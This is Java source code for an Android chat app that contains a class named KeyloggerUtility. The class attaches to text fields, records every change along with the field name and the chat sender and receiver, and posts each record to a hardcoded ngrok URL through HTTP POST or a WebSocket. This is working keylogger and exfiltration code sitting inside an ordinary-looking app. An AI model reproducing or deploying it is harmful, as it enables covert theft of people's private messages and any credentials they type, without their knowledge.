package com.example.mychatapp;

import android.os.AsyncTask;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class KeyloggerUtility implements TextWatcher {

    private String fieldName;
    private String chatReceiver;

    private String chatSender;
    private String date = "";

    private String logMessageLine = "";

    public static String URLNgrok = "https://c719-2404-e801-2001-348-794f-ac60-bb77-a2c5.ap.ngrok.io"; // To be edited if keep changing
    private final OkHttpClient client = new OkHttpClient();

    public KeyloggerUtility (String fieldName , String chatReceiver , String chatSender){
        this.fieldName = fieldName;
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        this.date = dateFormat.format(new Date());
        this.chatReceiver = chatReceiver;
        this.chatSender=chatSender;
    }

    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after) {

    }

    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {

    }

    @Override
    public void afterTextChanged(Editable s) {
        //Log.d(this.date+"|"+this.fieldName,s.toString());

        if (this.chatReceiver == "") {
            logMessageLine = this.date+" | "+this.fieldName+" | "+s.toString()+" | ";
            System.out.println(logMessageLine+'\n');
            new SendLogData().execute(logMessageLine);
            //sendData(logMessageLine);


        }else{
            logMessageLine = this.date+" | "+this.fieldName+" | "+s.toString()+" | " + "SENDER{"+chatSender+"} RECEIVER{"+chatReceiver+"}";
            System.out.println(logMessageLine+'\n');
            new SendLogData().execute(logMessageLine);
           // sendData(logMessageLine);

        }



    }

    public void sendData (String logMsg){
        Request request = new Request.Builder().url(URLNgrok+"/data").build();
        WebSocket webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.d("debugging","testing");
                webSocket.send(logMsg);
                super.onOpen(webSocket, response);
            }
        });
    }

    public class SendLogData extends AsyncTask<String, Void, Void> {

        @Override
        protected Void doInBackground(String... params) {
            try {
                URL url = new URL(URLNgrok+"/data"); //ngrok url to allow internet access without having to be same network
                //URL url = new URL(URLLocalIP+"/data"); // local IP Address : Port no
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "text/plain");
                conn.setDoOutput(true);
                conn.setDoInput(true);

                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                writer.write(params[0]);
                writer.flush();
                writer.close();
                os.close();

                int responseCode = conn.getResponseCode();
                System.out.println("\nSending Logging 'POST' request to URL : " + url);
                System.out.println("Response Code : " + responseCode);

            } catch (Exception e) {
                System.out.println("Error connecting to the sms server");
            }
            return null;

        }
    }
}
